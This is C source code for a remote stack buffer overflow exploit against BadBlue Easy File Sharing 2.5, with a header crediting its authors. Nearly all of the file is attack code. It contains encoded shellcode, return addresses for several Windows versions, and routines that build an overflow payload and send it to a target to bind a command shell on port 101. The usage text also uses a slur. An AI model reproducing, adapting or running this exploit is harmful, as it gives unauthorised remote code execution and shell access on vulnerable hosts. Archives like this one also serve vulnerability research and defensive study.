/*
BadBlue, Easy File Sharing Remote BOverflow

Homepage:         badblue.com
Affected version: v2.5 (2.60 and below not tested)
Patched  version: v2.61
Link:             badblue.com/bbs98.exe
Date:             27 February 2005

Application Risk: Severely High
Internet Risk:    Low

Dicovery Credits: Andres Tarasco (atarasco _at_ sia.es)
Exploit Credits : class101 & metasploit.com

Notes:

  -6 bad chars, 0x00, 0x26, 0x20, 0x0A, 0x8C, 0x3C, badly interpreted by
BadBlue
  -using offsets from ext.dll, universal.
  -use findjmp2 to quick search into ext.dll to see
   if the offsets changes in the others BadBlue's versions below 2.5
  -if you need the v2.5 for exploitation's pratices, get it on class101.org
  -rename to .c for nux, haven't tested this one but it should works fine.

Greet:

  Nima Majidi
        Behrang Fouladi
  Pejman
  Hat-Squad.com
  metasploit.com
  A^C^E of addict3d.org
  str0ke of milw0rm.com
  and my homy class101.org :>
*/

#include <stdio.h>
#include <string.h>
#include <time.h>
#ifdef WIN32
#include "winsock2.h"
#pragma comment(lib, "ws2_32")
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#endif

char scode[]=
/*XORed, I kiss metasploit.com because they are what means elite!*/
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x03"
"\x7b\x5b\x13\x83\xee\xfc\xe2\xf4\xff\x11\xb0\x5c\xeb\x82\xa4\xec"
"\xfc\x1b\xd0\x7f\x27\x5f\xd0\x56\x3f\xf0\x27\x16\x7b\x7a\xb4\x98"
"\x4c\x63\xd0\x4c\x23\x7a\xb0\xf0\x33\x32\xd0\x27\x88\x7a\xb5\x22"
"\xc3\xe2\xf7\x97\xc3\x0f\x5c\xd2\xc9\x76\x5a\xd1\xe8\x8f\x60\x47"
"\x27\x53\x2e\xf0\x88\x24\x7f\x12\xe8\x1d\xd0\x1f\x48\xf0\x04\x0f"
"\x02\x90\x58\x3f\x88\xf2\x37\x37\x1f\x1a\x98\x22\xc3\x1f\xd0\x53"
"\x33\xf0\x1b\x1f\x88\x0b\x47\xbe\x88\x3b\x53\x4d\x6b\xf5\x15\x1d"
"\xef\x2b\xa4\xc5\x32\xa0\x3d\x40\x65\x13\x68\x21\x6b\x0c\x28\x21"
"\x5c\x2f\xa4\xc3\x6b\xb0\xb6\xef\x38\x2b\xa4\xc5\x5c\xf2\xbe\x75"
"\x82\x96\x53\x11\x56\x11\x59\xec\xd3\x13\x82\x1a\xf6\xd6\x0c\xec"
"\xd5\x28\x08\x40\x50\x28\x18\x40\x40\x28\xa4\xc3\x65\x13\x5b\x76"
"\x65\x28\xd2\xf2\x96\x13\xff\x09\x73\xbc\x0c\xec\xd5\x11\x4b\x42"
"\x56\x84\x8b\x7b\xa7\xd6\x75\xfa\x54\x84\x8d\x40\x56\x84\x8b\x7b"
"\xe6\x32\xdd\x5a\x54\x84\x8d\x43\x57\x2f\x0e\xec\xd3\xe8\x33\xf4"
"\x7a\xbd\x22\x44\xfc\xad\x0e\xec\xd3\x1d\x31\x77\x65\x13\x38\x7e"
"\x8a\x9e\x31\x43\x5a\x52\x97\x9a\xe4\x11\x1f\x9a\xe1\x4a\x9b\xe0"
"\xa9\x85\x19\x3e\xfd\x39\x77\x80\x8e\x01\x63\xb8\xa8\xd0\x33\x61"
"\xfd\xc8\x4d\xec\x76\x3f\xa4\xc5\x58\x2c\x09\x42\x52\x2a\x31\x12"
"\x52\x2a\x0e\x42\xfc\xab\x33\xbe\xda\x7e\x95\x40\xfc\xad\x31\xec"
"\xfc\x4c\xa4\xc3\x88\x2c\xa7\x90\xc7\x1f\xa4\xc5\x51\x84\x8b\x7b"
"\xf3\xf1\x5f\x4c\x50\x84\x8d\xec\xd3\x7b\x5b\x13";

char payload[1024];

char ebx[]="\x05\x53\x02\x10";  /*call.ext.dll*/
char ebx2[]="\xB0\x55\x02\x10"; /*pop.pop.ret.ext.dll thx findjmp2 ;>*/
char pad[]="\xEB\x0C\x90\x90";
char pad2[]="\xE9\x05\xFE\xFF\xFF";
char EOL[]="\x0D\x0A\x0D\x0A";
char talk[]=
"\x47\x45\x54\x20\x2F\x65\x78\x74\x2E\x64\x6C\x6C\x3F\x6D\x66\x63"
"\x69\x73\x61\x70\x69\x63\x6F\x6D\x6D\x61\x6E\x64\x3D";

#ifdef WIN32
 WSADATA wsadata;
#endif

void ver();
void usage(char* us);

int main(int argc,char *argv[])
{
 ver();
 unsigned long gip;
 unsigned short gport;
 char *target, *os;
 if
(argc>6||argc<3||atoi(argv[1])>3||atoi(argv[1])<1){usage(argv[0]);return -1;
}
 if (argc==5){usage(argv[0]);return -1;}
    if (strlen(argv[2])<7){usage(argv[0]);return -1;}
    if (argc==6)
 {
        if (strlen(argv[4])<7){usage(argv[0]);return -1;}
 }
#ifndef WIN32
 if (argc==6)
 {
   gip=inet_addr(argv[4])^(long)0x93939393;
  gport=htons(atoi(argv[5]))^(short)0x9393;
 }
#define Sleep  sleep
#define SOCKET  int
#define closesocket(s) close(s)
#else
 if (WSAStartup(MAKEWORD(2,0),&wsadata)!=0){printf("[+] wsastartup
error\n");return -1;}
 if (argc==6)
 {
  gip=inet_addr(argv[4])^(ULONG)0x93939393;
  gport=htons(atoi(argv[5]))^(USHORT)0x9393;
 }
#endif
 int ip=htonl(inet_addr(argv[2])), port;
 if (argc==4||argc==6){port=atoi(argv[3]);} else port=80;
 SOCKET s;fd_set mask;struct timeval timeout; struct sockaddr_in server;
 s=socket(AF_INET,SOCK_STREAM,0);
 if (s==-1){printf("[+] socket() error\n");return -1;}
 if (atoi(argv[1]) == 1){target=ebx;os="Win2k SP4 Server English\n[+]
Win2k SP4 Pro.   English\n[+]            Win2k SP- -      -";}
 if (atoi(argv[1]) == 2){target=ebx2;os="WinXP SP2  Pro. English\n[+]
WinXP SP1a Pro. English\n[+]            WinXP SP-  -    -";}
 if (atoi(argv[1]) == 3){target=ebx2;os="Win2003 SP4 Server English\n[+]
Win2003 SP- -      -";}
 printf("[+] target(s): %s\n",os);
 server.sin_family=AF_INET;
 server.sin_addr.s_addr=htonl(ip);
 server.sin_port=htons(port);
 if (argc==6){printf("[+] reverse mode disabled for this exploit\n");
 printf("[+] get the source at class101.org and update
yourself!\n");return -1;}
 connect(s,( struct sockaddr *)&server,sizeof(server));
 timeout.tv_sec=3;timeout.tv_usec=0;FD_ZERO(&mask);FD_SET(s,&mask);
 switch(select(s+1,NULL,&mask,NULL,&timeout))
 {
  case -1: {printf("[+] select() error\n");closesocket(s);return -1;}
  case 0: {printf("[+] connect() error\n");closesocket(s);return -1;}
  default:
  if(FD_ISSET(s,&mask))
  {
   printf("[+] connected, constructing the payload...\n");
#ifdef WIN32
   Sleep(1000);
#else
   Sleep(1);
#endif
   strcpy(payload,talk);
   memset(payload+29,0x90,520);
   if (atoi(argv[1]) == 1||atoi(argv[1]) == 2)
   {
    memcpy(payload+29+492,&pad,4);
    memcpy(payload+521+4,target,4);
    memcpy(payload+536+1,pad2,5);
   }
   else
   {
    memcpy(payload+29+485,&pad,4);
    memcpy(payload+514+4,target,4);
    memcpy(payload+529+1,pad2,5);
   }
   strcat(payload,EOL);
   memcpy(payload+36+3,scode,strlen(scode));
   if (send(s,payload,strlen(payload),0)==-1) { printf("[+] sending error 1,
the server prolly rebooted.\n");return -1;}
#ifdef WIN32
   Sleep(2000);
#else
   Sleep(2);
#endif

   printf("[+] size of payload: %d\n",strlen(payload));
   printf("[+] payload sent.\n");
   return 0;
  }
 }
 closesocket(s);
#ifdef WIN32
 WSACleanup();
#endif
 return 0;
}


void usage(char* us)
{
 printf("USAGE:\n");
 printf("      [+]  . 101_bblu.exe Target VulnIP (bind mode)\n");
 printf("      [+]  . 101_bblu.exe Target VulnIP VulnPORT (bind mode)\n");
 printf("      [+]  . 101_bblu.exe Target VulnIP VulnPORT GayIP GayPORT
(reverse mode)\n");
 printf("TARGET:                               \n");
 printf("      [+] 1. Win2k  SP4  Server English (*)\n");
 printf("      [+] 1. Win2k  SP4  Pro    English (*)\n");
 printf("      [+] 1. Win2k  SP-  -      -          \n");
 printf("      [+] 2. WinXP  SP2  Pro.   English    \n");
 printf("      [+] 2. WinXP  SP1a Pro.   English (*)\n");
 printf("      [+] 2. WinXP  SP-  -      -          \n");
 printf("      [+] 3. Win2k3 SP0  Server Italian (*)\n");
 printf("      [+] 3. Win2k3 SP-  -      -          \n");
 printf("NOTE:                                      \n");
 printf("      The exploit bind a cmdshell port 101 or\n");
 printf("      reverse a cmdshell on your listener.\n");
 printf("      A wildcard (*) mean tested working, else, supposed
working.\n");
 printf("      A symbol   (-) mean all.\n");
 printf("      Compilation msvc6, cygwin, Linux.\n");
 return;
}
void ver()
{
 printf("
\n");
 printf("
===================================================[0.1]=====\n");
 printf("        ================BadBlue, Easy File Sharing
2.5===============\n");
 printf("        ================ext.dll, Remote Stack
Overflow===============\n");
 printf("        ======coded by
class101==================[Hat-Squad.com]=====\n");
 printf("        =====================================[class101.org
2005]=====\n");
 printf("
\n");
}

